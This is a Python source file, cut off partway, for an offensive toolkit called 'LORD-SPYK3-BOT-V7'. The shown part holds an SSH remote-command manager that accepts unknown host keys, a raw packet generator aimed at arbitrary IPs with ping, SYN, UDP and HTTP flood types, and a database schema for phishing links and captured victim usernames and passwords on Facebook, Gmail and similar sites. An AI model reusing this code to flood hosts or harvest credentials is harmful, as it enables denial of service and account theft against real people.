#!/usr/bin/env python3
"""
🕷️ LORD-SPYK3-BOT-V7 - Ultimate Cybersecurity Command & Control Platform
Author: Ian Carter Kulani
Version: 7.0.0

A complete cybersecurity automation platform featuring:
- 5000+ Security Commands
- SSH Remote Access via 6+ Platforms
- Real Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
- Nikto Web Vulnerability Scanner
- Shodan & Hunter.io Integration
- Social Engineering Suite
- Graphical Reports & Statistics
- Multi-Platform Integration (Discord, Telegram, WhatsApp, Signal, Slack, iMessage)
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict
from enum import Enum

# =====================
# VERSION INFORMATION
# =====================
VERSION = "7.0.0"
AUTHOR = "Ian Carter Kulani"
NAME = "LORD-SPYK3-BOT-V7"

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography for encryption
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Paramiko for SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telethon for Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack SDK
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP
    from scapy.all import send, sr1, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Shodan
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

# Hunter.io
try:
    import pyhunter
    HUNTER_AVAILABLE = True
except ImportError:
    HUNTER_AVAILABLE = False

# Selenium for WhatsApp
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# =====================
# COLOR THEME (Purple/Black)
# =====================
class Colors:
    """Purple/Black spy theme colors"""
    PURPLE_DARK = '\033[35m'
    PURPLE_MEDIUM = '\033[95m'
    PURPLE_LIGHT = '\033[96m'
    BLACK = '\033[30m'
    WHITE = '\033[97m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    
    PRIMARY = PURPLE_DARK
    SECONDARY = PURPLE_MEDIUM
    ACCENT = PURPLE_LIGHT
    SUCCESS = GREEN
    ERROR = RED
    WARNING = YELLOW
    INFO = CYAN

# =====================
# ENUMS
# =====================
class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    MIXED = "mixed"
    RANDOM = "random"

class ScanType(Enum):
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    VULNERABILITY = "vulnerability"
    FULL = "full"
    UDP = "udp"
    OS_DETECTION = "os_detection"
    WEB = "web"
    NIKTO = "nikto"
    SHODAN = "shodan"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class PhishingPlatform(Enum):
    FACEBOOK = "facebook"
    INSTAGRAM = "instagram"
    TWITTER = "twitter"
    LINKEDIN = "linkedin"
    GMAIL = "gmail"
    CUSTOM = "custom"

# =====================
# DATA CLASSES
# =====================
@dataclass
class SSHConnection:
    """SSH connection configuration"""
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None
    notes: str = ""

@dataclass
class SSHCommandResult:
    """SSH command execution result"""
    success: bool
    output: str
    error: Optional[str] = None
    execution_time: float = 0.0
    exit_code: int = -1

@dataclass
class TrafficGenerator:
    """Traffic generation session"""
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"
    error: Optional[str] = None

@dataclass
class IPAnalysisResult:
    """Complete IP analysis result"""
    target_ip: str
    timestamp: str
    ping_result: Dict[str, Any]
    port_scan_result: Dict[str, Any]
    geolocation_result: Dict[str, Any]
    security_status: Dict[str, Any]
    recommendations: List[str]
    success: bool = True
    error: Optional[str] = None
    graphics_files: Dict[str, str] = field(default_factory=dict)

@dataclass
class NiktoResult:
    """Nikto scan result"""
    target: str
    timestamp: str
    vulnerabilities: List[Dict]
    scan_time: float
    output_file: str
    success: bool
    error: Optional[str] = None

@dataclass
class PhishingLink:
    """Phishing link configuration"""
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    captured_credentials: List[Dict] = field(default_factory=list)

@dataclass
class CommandResult:
    """Command execution result"""
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Configuration manager with encryption"""
    
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start_monitoring": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "max_traceroute_hops": 30,
        "report_format": "both",
        "generate_graphics": True,
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "telegram": {
            "enabled": False,
            "api_id": "",
            "api_hash": "",
            "bot_token": "",
            "channel_id": ""
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "command_prefix": "/",
            "allowed_contacts": []
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "command_prefix": "!",
            "allowed_numbers": []
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "channel_id": "",
            "command_prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "command_prefix": "!"
        },
        "shodan": {
            "enabled": False,
            "api_key": ""
        },
        "hunter": {
            "enabled": False,
            "api_key": ""
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5,
            "keep_alive": 60
        }
    }
    
    def __init__(self, config_dir: str = ".lord_spyk3"):
        self.config_dir = Path(config_dir)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.key_file = self.config_dir / ".key"
        self.config = self.load()
    
    def _get_or_create_key(self) -> Optional[bytes]:
        """Get or create encryption key"""
        if not CRYPTO_AVAILABLE:
            return None
        
        try:
            if self.key_file.exists():
                with open(self.key_file, 'rb') as f:
                    return f.read()
            else:
                key = Fernet.generate_key()
                with open(self.key_file, 'wb') as f:
                    f.write(key)
                return key
        except Exception as e:
            print(f"Key error: {e}")
            return None
    
    def encrypt(self, data: str) -> str:
        """Encrypt sensitive data"""
        if not data or not CRYPTO_AVAILABLE:
            return data
        
        try:
            key = self._get_or_create_key()
            if key:
                f = Fernet(key)
                return f.encrypt(data.encode()).decode()
        except:
            pass
        return base64.b64encode(data.encode()).decode()
    
    def decrypt(self, data: str) -> str:
        """Decrypt sensitive data"""
        if not data:
            return ""
        
        if CRYPTO_AVAILABLE:
            try:
                key = self._get_or_create_key()
                if key:
                    f = Fernet(key)
                    return f.decrypt(data.encode()).decode()
            except:
                pass
        
        try:
            return base64.b64decode(data).decode()
        except:
            return data
    
    def load(self) -> Dict:
        """Load configuration"""
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    # Merge with defaults
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        """Save configuration"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        """Get configuration value"""
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        """Set configuration value"""
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """Unified SQLite database manager"""
    
    def __init__(self, db_path: str = "spyk3_data.db"):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS ip_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target_ip TEXT NOT NULL,
                analysis_result TEXT NOT NULL,
                report_path TEXT,
                success BOOLEAN DEFAULT 1,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                vulnerabilities TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME,
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                success BOOLEAN DEFAULT 1,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.conn.execute(
                "INSERT INTO command_history (command, source, success, output, execution_time) VALUES (?, ?, ?, ?, ?)",
                (command, source, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        """Log threat alert"""
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes) VALUES (?, ?, ?)",
                (ip, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str) -> bool:
        """Mark IP as blocked"""
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        """Unblock IP"""
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_scans'] = self.conn.execute("SELECT COUNT(*) FROM scans").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        except:
            pass
        return stats
    
    def close(self):
        """Close database connection"""
        try:
            self.conn.close()
        except:
            pass

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.connections: Dict[str, paramiko.SSHClient] = {}
        self.encryption = config
    
    def is_available(self) -> bool:
        """Check if SSH is available"""
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str, 
                       password: str = None, key_path: str = None, 
                       port: int = 22, notes: str = "") -> SSHConnection:
        """Add SSH connection"""
        conn_id = str(uuid.uuid4())[:8]
        
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path
        )
        
        # Encrypt password for storage
        encrypted_password = self.encryption.encrypt(password) if password else None
        
        self.db.conn.execute(
            """INSERT OR REPLACE INTO ssh_connections 
               (id, name, host, port, username, password_encrypted, key_path, notes)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (conn_id, name, host, port, username, encrypted_password, key_path, notes)
        )
        self.db.conn.commit()
        
        return conn
    
    def connect(self, conn_id: str) -> bool:
        """Connect to SSH server"""
        if not self.is_available():
            return False
        
        # Get connection from database
        row = self.db.conn.execute(
            "SELECT * FROM ssh_connections WHERE id = ?", (conn_id,)
        ).fetchone()
        
        if not row:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': row['host'],
                'port': row['port'],
                'username': row['username'],
                'timeout': self.config.get('ssh.default_timeout', 30)
            }
            
            if row['password_encrypted']:
                password = self.encryption.decrypt(row['password_encrypted'])
                connect_kwargs['password'] = password
            elif row['key_path'] and os.path.exists(row['key_path']):
                connect_kwargs['key_filename'] = row['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            # Update status
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            
            return True
            
        except Exception as e:
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'error' WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return False
    
    def disconnect(self, conn_id: str):
        """Disconnect SSH connection"""
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def disconnect_all(self):
        """Disconnect all SSH connections"""
        for conn_id in list(self.connections.keys()):
            self.disconnect(conn_id)
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> SSHCommandResult:
        """Execute command on remote server"""
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return SSHCommandResult(
                    success=False,
                    output="",
                    error="Not connected to server",
                    execution_time=0,
                    exit_code=-1
                )
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            # Log command
            self.db.conn.execute(
                """INSERT INTO ssh_commands (connection_id, command, output, exit_code, execution_time, success)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (conn_id, command, output[:5000], exit_code, execution_time, exit_code == 0)
            )
            self.db.conn.commit()
            
            return SSHCommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                error=error if error else None,
                execution_time=execution_time,
                exit_code=exit_code
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            return SSHCommandResult(
                success=False,
                output="",
                error=str(e),
                execution_time=execution_time,
                exit_code=-1
            )
    
    def get_connections(self) -> List[Dict]:
        """Get all SSH connections"""
        rows = self.db.conn.execute(
            "SELECT * FROM ssh_connections ORDER BY created_at DESC"
        ).fetchall()
        
        connections = []
        for row in rows:
            conn = dict(row)
            conn['connected'] = row['id'] in self.connections
            connections.append(conn)
        
        return connections

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    """Real network traffic generator"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        """Get available traffic types"""
        types = [t.value for t in TrafficType]
        
        # Remove flood types if not allowed
        if not self.config.get('traffic_generation.allow_floods', False):
            types = [t for t in types if not t.endswith('_flood')]
        
        return types
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        """Generate traffic"""
        # Validate
        if traffic_type not in [t.value for t in TrafficType]:
            raise ValueError(f"Invalid traffic type: {traffic_type}")
        
        max_duration = self.config.get('traffic_generation.max_duration', 300)
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum ({max_duration}s)")
        
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        # Set default port
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        # Start generator thread
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        
        # Log to database
        self.db.conn.execute(
            """INSERT INTO traffic_logs 
               (traffic_type, target_ip, target_port, duration, status)
               VALUES (?, ?, ?, ?, ?)""",
            (traffic_type, target_ip, port, duration, "running")
        )
        self.db.conn.commit()
        
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int, 
                       stop_event: threading.Event):
        """Run traffic generator in thread"""
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                pass
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        # Update database
        self.db.conn.execute(
            """UPDATE traffic_logs 
               SET packets_sent = ?, bytes_sent = ?, status = ?, end_time = ?
               WHERE traffic_type = ? AND target_ip = ? AND start_time = ?""",
            (packets_sent, bytes_sent, generator.status, generator.end_time,
             generator.traffic_type, generator.target_ip, generator.start_time)
        )
        self.db.conn.commit()
    
    def _get_generator_func(self, traffic_type: str):
        """Get generator function"""
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        """ICMP echo request"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                # Use system ping
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        """TCP SYN packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        """TCP ACK packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        """TCP connect"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        """UDP packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"SPYK3"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"SPYK3", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        """HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "SPYK3"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        """HTTP POST request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data", 
                        headers={"User-Agent": "SPYK3", "Content-Type": "application/x-www-form-urlencoded"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        """HTTPS request"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "SPYK3"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        """DNS query"""
        try:
            # Simple DNS query for google.com
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        """ARP request"""
        try:
            if SCAPY_AVAILABLE:
                packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        """Mixed traffic"""
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        """Random traffic type"""
